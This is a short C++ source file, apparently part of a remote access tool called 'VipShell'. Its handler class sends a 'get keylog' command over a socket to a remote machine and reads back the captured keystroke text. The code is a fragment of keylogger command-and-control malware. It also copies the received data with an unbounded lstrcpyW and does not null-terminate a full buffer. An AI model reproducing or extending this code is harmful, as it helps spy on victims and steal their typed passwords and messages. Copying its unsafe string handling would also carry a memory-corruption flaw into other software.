#include "stdafx.h"
#include ".\servergetkeynohookhandle.h"

CServerGetKeyNoHookHandle::CServerGetKeyNoHookHandle(void)
{
}

CServerGetKeyNoHookHandle::~CServerGetKeyNoHookHandle(void)
{
}

bool CServerGetKeyNoHookHandle::GetString(WCHAR* szText)
{
	if(!szText)
		return false;
	char szBuf[500] = {0};
	int nRet = m_hServer.Recv(szBuf, 500, 0, false);
	if(nRet == SOCKET_ERROR)
		return false;
	if(nRet == 0)
		return false;
	ATL::CA2W szRet(szBuf);
	lstrcpyW(szText, szRet);
	return true;
}
bool CServerGetKeyNoHookHandle::Statr()
{
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_GETKEYLOG;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}